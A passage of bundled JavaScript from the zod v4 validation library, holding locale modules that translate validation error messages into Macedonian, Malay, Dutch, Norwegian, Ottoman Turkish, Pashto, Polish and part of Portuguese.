        return `Invalid ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0431\u0440\u043E\u0458: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0431\u0438\u0434\u0435 \u0434\u0435\u043B\u0438\u0432 \u0441\u043E ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D\u0438 \u043A\u043B\u0443\u0447\u0435\u0432\u0438" : "\u041D\u0435\u043F\u0440\u0435\u043F\u043E\u0437\u043D\u0430\u0435\u043D \u043A\u043B\u0443\u0447"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u043A\u043B\u0443\u0447 \u0432\u043E ${issue2.origin}`;
      case "invalid_union":
        return "\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441";
      case "invalid_element":
        return `\u0413\u0440\u0435\u0448\u043D\u0430 \u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442 \u0432\u043E ${issue2.origin}`;
      default:
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441`;
    }
  };
};
function mk_default() {
  return {
    localeError: error27()
  };
}
// node_modules/zod/v4/locales/ms.js
var error28 = () => {
  const Sizable = {
    string: { unit: "aksara", verb: "mempunyai" },
    file: { unit: "bait", verb: "mempunyai" },
    array: { unit: "elemen", verb: "mempunyai" },
    set: { unit: "elemen", verb: "mempunyai" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "alamat e-mel",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "tarikh masa ISO",
    date: "tarikh ISO",
    time: "masa ISO",
    duration: "tempoh ISO",
    ipv4: "alamat IPv4",
    ipv6: "alamat IPv6",
    cidrv4: "julat IPv4",
    cidrv6: "julat IPv6",
    base64: "string dikodkan base64",
    base64url: "string dikodkan base64url",
    json_string: "string JSON",
    e164: "nombor E.164",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "nombor"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Input tidak sah: dijangka instanceof ${issue2.expected}, diterima ${received}`;
        }
        return `Input tidak sah: dijangka ${expected}, diterima ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Input tidak sah: dijangka ${stringifyPrimitive(issue2.values[0])}`;
        return `Pilihan tidak sah: dijangka salah satu daripada ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Terlalu besar: dijangka ${issue2.origin ?? "nilai"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elemen"}`;
        return `Terlalu besar: dijangka ${issue2.origin ?? "nilai"} adalah ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Terlalu kecil: dijangka ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Terlalu kecil: dijangka ${issue2.origin} adalah ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `String tidak sah: mesti bermula dengan "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `String tidak sah: mesti berakhir dengan "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `String tidak sah: mesti mengandungi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `String tidak sah: mesti sepadan dengan corak ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} tidak sah`;
      }
      case "not_multiple_of":
        return `Nombor tidak sah: perlu gandaan ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kunci tidak dikenali: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kunci tidak sah dalam ${issue2.origin}`;
      case "invalid_union":
        return "Input tidak sah";
      case "invalid_element":
        return `Nilai tidak sah dalam ${issue2.origin}`;
      default:
        return `Input tidak sah`;
    }
  };
};
function ms_default() {
  return {
    localeError: error28()
  };
}
// node_modules/zod/v4/locales/nl.js
var error29 = () => {
  const Sizable = {
    string: { unit: "tekens", verb: "heeft" },
    file: { unit: "bytes", verb: "heeft" },
    array: { unit: "elementen", verb: "heeft" },
    set: { unit: "elementen", verb: "heeft" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "invoer",
    email: "emailadres",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum en tijd",
    date: "ISO datum",
    time: "ISO tijd",
    duration: "ISO duur",
    ipv4: "IPv4-adres",
    ipv6: "IPv6-adres",
    cidrv4: "IPv4-bereik",
    cidrv6: "IPv6-bereik",
    base64: "base64-gecodeerde tekst",
    base64url: "base64 URL-gecodeerde tekst",
    json_string: "JSON string",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "invoer"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "getal"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ongeldige invoer: verwacht instanceof ${issue2.expected}, ontving ${received}`;
        }
        return `Ongeldige invoer: verwacht ${expected}, ontving ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ongeldige invoer: verwacht ${stringifyPrimitive(issue2.values[0])}`;
        return `Ongeldige optie: verwacht \xE9\xE9n van ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        const longName = issue2.origin === "date" ? "laat" : issue2.origin === "string" ? "lang" : "groot";
        if (sizing)
          return `Te ${longName}: verwacht dat ${issue2.origin ?? "waarde"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementen"} ${sizing.verb}`;
        return `Te ${longName}: verwacht dat ${issue2.origin ?? "waarde"} ${adj}${issue2.maximum.toString()} is`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        const shortName = issue2.origin === "date" ? "vroeg" : issue2.origin === "string" ? "kort" : "klein";
        if (sizing) {
          return `Te ${shortName}: verwacht dat ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} ${sizing.verb}`;
        }
        return `Te ${shortName}: verwacht dat ${issue2.origin} ${adj}${issue2.minimum.toString()} is`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Ongeldige tekst: moet met "${_issue.prefix}" beginnen`;
        }
        if (_issue.format === "ends_with")
          return `Ongeldige tekst: moet op "${_issue.suffix}" eindigen`;
        if (_issue.format === "includes")
          return `Ongeldige tekst: moet "${_issue.includes}" bevatten`;
        if (_issue.format === "regex")
          return `Ongeldige tekst: moet overeenkomen met patroon ${_issue.pattern}`;
        return `Ongeldig: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ongeldig getal: moet een veelvoud van ${issue2.divisor} zijn`;
      case "unrecognized_keys":
        return `Onbekende key${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ongeldige key in ${issue2.origin}`;
      case "invalid_union":
        return "Ongeldige invoer";
      case "invalid_element":
        return `Ongeldige waarde in ${issue2.origin}`;
      default:
        return `Ongeldige invoer`;
    }
  };
};
function nl_default() {
  return {
    localeError: error29()
  };
}
// node_modules/zod/v4/locales/no.js
var error30 = () => {
  const Sizable = {
    string: { unit: "tegn", verb: "\xE5 ha" },
    file: { unit: "bytes", verb: "\xE5 ha" },
    array: { unit: "elementer", verb: "\xE5 inneholde" },
    set: { unit: "elementer", verb: "\xE5 inneholde" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "input",
    email: "e-postadresse",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO dato- og klokkeslett",
    date: "ISO-dato",
    time: "ISO-klokkeslett",
    duration: "ISO-varighet",
    ipv4: "IPv4-omr\xE5de",
    ipv6: "IPv6-omr\xE5de",
    cidrv4: "IPv4-spekter",
    cidrv6: "IPv6-spekter",
    base64: "base64-enkodet streng",
    base64url: "base64url-enkodet streng",
    json_string: "JSON-streng",
    e164: "E.164-nummer",
    jwt: "JWT",
    template_literal: "input"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "tall",
    array: "liste"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ugyldig input: forventet instanceof ${issue2.expected}, fikk ${received}`;
        }
        return `Ugyldig input: forventet ${expected}, fikk ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ugyldig verdi: forventet ${stringifyPrimitive(issue2.values[0])}`;
        return `Ugyldig valg: forventet en av ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `For stor(t): forventet ${issue2.origin ?? "value"} til \xE5 ha ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elementer"}`;
        return `For stor(t): forventet ${issue2.origin ?? "value"} til \xE5 ha ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `For lite(n): forventet ${issue2.origin} til \xE5 ha ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `For lite(n): forventet ${issue2.origin} til \xE5 ha ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ugyldig streng: m\xE5 starte med "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Ugyldig streng: m\xE5 ende med "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Ugyldig streng: m\xE5 inneholde "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Ugyldig streng: m\xE5 matche m\xF8nsteret ${_issue.pattern}`;
        return `Ugyldig ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ugyldig tall: m\xE5 v\xE6re et multiplum av ${issue2.divisor}`;
      case "unrecognized_keys":
        return `${issue2.keys.length > 1 ? "Ukjente n\xF8kler" : "Ukjent n\xF8kkel"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Ugyldig n\xF8kkel i ${issue2.origin}`;
      case "invalid_union":
        return "Ugyldig input";
      case "invalid_element":
        return `Ugyldig verdi i ${issue2.origin}`;
      default:
        return `Ugyldig input`;
    }
  };
};
function no_default() {
  return {
    localeError: error30()
  };
}
// node_modules/zod/v4/locales/ota.js
var error31 = () => {
  const Sizable = {
    string: { unit: "harf", verb: "olmal\u0131d\u0131r" },
    file: { unit: "bayt", verb: "olmal\u0131d\u0131r" },
    array: { unit: "unsur", verb: "olmal\u0131d\u0131r" },
    set: { unit: "unsur", verb: "olmal\u0131d\u0131r" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "giren",
    email: "epostag\xE2h",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO heng\xE2m\u0131",
    date: "ISO tarihi",
    time: "ISO zaman\u0131",
    duration: "ISO m\xFCddeti",
    ipv4: "IPv4 ni\u015F\xE2n\u0131",
    ipv6: "IPv6 ni\u015F\xE2n\u0131",
    cidrv4: "IPv4 menzili",
    cidrv6: "IPv6 menzili",
    base64: "base64-\u015Fifreli metin",
    base64url: "base64url-\u015Fifreli metin",
    json_string: "JSON metin",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "giren"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "numara",
    array: "saf",
    null: "gayb"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `F\xE2sit giren: umulan instanceof ${issue2.expected}, al\u0131nan ${received}`;
        }
        return `F\xE2sit giren: umulan ${expected}, al\u0131nan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `F\xE2sit giren: umulan ${stringifyPrimitive(issue2.values[0])}`;
        return `F\xE2sit tercih: m\xFBteberler ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Fazla b\xFCy\xFCk: ${issue2.origin ?? "value"}, ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "elements"} sahip olmal\u0131yd\u0131.`;
        return `Fazla b\xFCy\xFCk: ${issue2.origin ?? "value"}, ${adj}${issue2.maximum.toString()} olmal\u0131yd\u0131.`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Fazla k\xFC\xE7\xFCk: ${issue2.origin}, ${adj}${issue2.minimum.toString()} ${sizing.unit} sahip olmal\u0131yd\u0131.`;
        }
        return `Fazla k\xFC\xE7\xFCk: ${issue2.origin}, ${adj}${issue2.minimum.toString()} olmal\u0131yd\u0131.`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `F\xE2sit metin: "${_issue.prefix}" ile ba\u015Flamal\u0131.`;
        if (_issue.format === "ends_with")
          return `F\xE2sit metin: "${_issue.suffix}" ile bitmeli.`;
        if (_issue.format === "includes")
          return `F\xE2sit metin: "${_issue.includes}" ihtiv\xE2 etmeli.`;
        if (_issue.format === "regex")
          return `F\xE2sit metin: ${_issue.pattern} nak\u015F\u0131na uymal\u0131.`;
        return `F\xE2sit ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `F\xE2sit say\u0131: ${issue2.divisor} kat\u0131 olmal\u0131yd\u0131.`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar ${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} i\xE7in tan\u0131nmayan anahtar var.`;
      case "invalid_union":
        return "Giren tan\u0131namad\u0131.";
      case "invalid_element":
        return `${issue2.origin} i\xE7in tan\u0131nmayan k\u0131ymet var.`;
      default:
        return `K\u0131ymet tan\u0131namad\u0131.`;
    }
  };
};
function ota_default() {
  return {
    localeError: error31()
  };
}
// node_modules/zod/v4/locales/ps.js
var error32 = () => {
  const Sizable = {
    string: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    file: { unit: "\u0628\u0627\u06CC\u067C\u0633", verb: "\u0648\u0644\u0631\u064A" },
    array: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    set: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0648\u0631\u0648\u062F\u064A",
    email: "\u0628\u0631\u06CC\u069A\u0646\u0627\u0644\u06CC\u06A9",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0646\u06CC\u067C\u0647 \u0627\u0648 \u0648\u062E\u062A",
    date: "\u0646\u06D0\u067C\u0647",
    time: "\u0648\u062E\u062A",
    duration: "\u0645\u0648\u062F\u0647",
    ipv4: "\u062F IPv4 \u067E\u062A\u0647",
    ipv6: "\u062F IPv6 \u067E\u062A\u0647",
    cidrv4: "\u062F IPv4 \u0633\u0627\u062D\u0647",
    cidrv6: "\u062F IPv6 \u0633\u0627\u062D\u0647",
    base64: "base64-encoded \u0645\u062A\u0646",
    base64url: "base64url-encoded \u0645\u062A\u0646",
    json_string: "JSON \u0645\u062A\u0646",
    e164: "\u062F E.164 \u0634\u0645\u06D0\u0631\u0647",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u064A"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0639\u062F\u062F",
    array: "\u0627\u0631\u06D0"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F instanceof ${issue2.expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${received} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
        }
        return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${received} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
      }
      case "invalid_value":
        if (issue2.values.length === 1) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${stringifyPrimitive(issue2.values[0])} \u0648\u0627\u06CC`;
        }
        return `\u0646\u0627\u0633\u0645 \u0627\u0646\u062A\u062E\u0627\u0628: \u0628\u0627\u06CC\u062F \u06CC\u0648 \u0644\u0647 ${joinValues(issue2.values, "|")} \u0685\u062E\u0647 \u0648\u0627\u06CC`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue2.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631\u0648\u0646\u0647"} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue2.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue2.maximum.toString()} \u0648\u064A`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} ${sizing.unit} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue2.origin} \u0628\u0627\u06CC\u062F ${adj}${issue2.minimum.toString()} \u0648\u064A`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.prefix}" \u0633\u0631\u0647 \u067E\u06CC\u0644 \u0634\u064A`;
        }
        if (_issue.format === "ends_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.suffix}" \u0633\u0631\u0647 \u067E\u0627\u06CC \u062A\u0647 \u0648\u0631\u0633\u064A\u0696\u064A`;
        }
        if (_issue.format === "includes") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F "${_issue.includes}" \u0648\u0644\u0631\u064A`;
        }
        if (_issue.format === "regex") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F ${_issue.pattern} \u0633\u0631\u0647 \u0645\u0637\u0627\u0628\u0642\u062A \u0648\u0644\u0631\u064A`;
        }
        return `${FormatDictionary[_issue.format] ?? issue2.format} \u0646\u0627\u0633\u0645 \u062F\u06CC`;
      }
      case "not_multiple_of":
        return `\u0646\u0627\u0633\u0645 \u0639\u062F\u062F: \u0628\u0627\u06CC\u062F \u062F ${issue2.divisor} \u0645\u0636\u0631\u0628 \u0648\u064A`;
      case "unrecognized_keys":
        return `\u0646\u0627\u0633\u0645 ${issue2.keys.length > 1 ? "\u06A9\u0644\u06CC\u0689\u0648\u0646\u0647" : "\u06A9\u0644\u06CC\u0689"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0646\u0627\u0633\u0645 \u06A9\u0644\u06CC\u0689 \u067E\u0647 ${issue2.origin} \u06A9\u06D0`;
      case "invalid_union":
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
      case "invalid_element":
        return `\u0646\u0627\u0633\u0645 \u0639\u0646\u0635\u0631 \u067E\u0647 ${issue2.origin} \u06A9\u06D0`;
      default:
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
    }
  };
};
function ps_default() {
  return {
    localeError: error32()
  };
}
// node_modules/zod/v4/locales/pl.js
var error33 = () => {
  const Sizable = {
    string: { unit: "znak\xF3w", verb: "mie\u0107" },
    file: { unit: "bajt\xF3w", verb: "mie\u0107" },
    array: { unit: "element\xF3w", verb: "mie\u0107" },
    set: { unit: "element\xF3w", verb: "mie\u0107" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "wyra\u017Cenie",
    email: "adres email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i godzina w formacie ISO",
    date: "data w formacie ISO",
    time: "godzina w formacie ISO",
    duration: "czas trwania ISO",
    ipv4: "adres IPv4",
    ipv6: "adres IPv6",
    cidrv4: "zakres IPv4",
    cidrv6: "zakres IPv6",
    base64: "ci\u0105g znak\xF3w zakodowany w formacie base64",
    base64url: "ci\u0105g znak\xF3w zakodowany w formacie base64url",
    json_string: "ci\u0105g znak\xF3w w formacie JSON",
    e164: "liczba E.164",
    jwt: "JWT",
    template_literal: "wej\u015Bcie"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "liczba",
    array: "tablica"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano instanceof ${issue2.expected}, otrzymano ${received}`;
        }
        return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${expected}, otrzymano ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${stringifyPrimitive(issue2.values[0])}`;
        return `Nieprawid\u0142owa opcja: oczekiwano jednej z warto\u015Bci ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Za du\u017Ca warto\u015B\u0107: oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt du\u017C(y/a/e): oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Za ma\u0142a warto\u015B\u0107: oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue2.minimum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt ma\u0142(y/a/e): oczekiwano, \u017Ce ${issue2.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zaczyna\u0107 si\u0119 od "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi ko\u0144czy\u0107 si\u0119 na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zawiera\u0107 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi odpowiada\u0107 wzorcowi ${_issue.pattern}`;
        return `Nieprawid\u0142ow(y/a/e) ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Nieprawid\u0142owa liczba: musi by\u0107 wielokrotno\u015Bci\u0105 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Nierozpoznane klucze${issue2.keys.length > 1 ? "s" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Nieprawid\u0142owy klucz w ${issue2.origin}`;
      case "invalid_union":
        return "Nieprawid\u0142owe dane wej\u015Bciowe";
      case "invalid_element":
        return `Nieprawid\u0142owa warto\u015B\u0107 w ${issue2.origin}`;
      default:
        return `Nieprawid\u0142owe dane wej\u015Bciowe`;
    }
  };
};
function pl_default() {
  return {
    localeError: error33()
  };
}
// node_modules/zod/v4/locales/pt.js
var error34 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "ter" },
    file: { unit: "bytes", verb: "ter" },
    array: { unit: "itens", verb: "ter" },
    set: { unit: "itens", verb: "ter" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "padr\xE3o",
    email: "endere\xE7o de e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "dura\xE7\xE3o ISO",
    ipv4: "endere\xE7o IPv4",
    ipv6: "endere\xE7o IPv6",
    cidrv4: "faixa de IPv4",
    cidrv6: "faixa de IPv6",
    base64: "texto codificado em base64",
    base64url: "URL codificada em base64",
    json_string: "texto JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\xFAmero",
    null: "nulo"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Tipo inv\xE1lido: esperado instanceof ${issue2.expected}, recebido ${received}`;
        }
        return `Tipo inv\xE1lido: esperado ${expected}, recebido ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Entrada inv\xE1lida: esperado ${stringifyPrimitive(issue2.values[0])}`;
        return `Op\xE7\xE3o inv\xE1lida: esperada uma das ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
